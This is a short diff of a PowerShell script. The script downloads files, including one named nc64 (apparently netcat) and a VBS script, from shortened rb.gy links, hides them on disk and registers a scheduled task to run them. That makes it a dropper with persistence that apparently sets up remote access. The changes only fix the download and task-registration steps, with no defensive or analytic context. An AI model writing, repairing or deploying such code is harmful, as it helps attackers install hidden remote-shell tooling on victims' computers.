@@ -33,9 +33,9 @@ $quietTxtUrl = "https://rb.gy/mx0i5"
 $nc64TxtUrl = "https://rb.gy/guty9"
 
 # Download files
-Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
-Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
-Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
+Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath -UseBasicParsing
+Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath -UseBasicParsing
+Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath -UseBasicParsing
 
 # Make all the downloaded files hidden
 $filesToHide = @($quietTxtPath, $nc64TxtPath, $scriptVbsPath)
@@ -61,8 +61,8 @@ try {
         # If not admin, create the task with the current user's context
         $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive
 
-        # Register the task with the current user's credentials
-        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -User $env:UserName -Force
+        # Register the task without the -User parameter
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
     }
 
     # Start the task immediately after registration
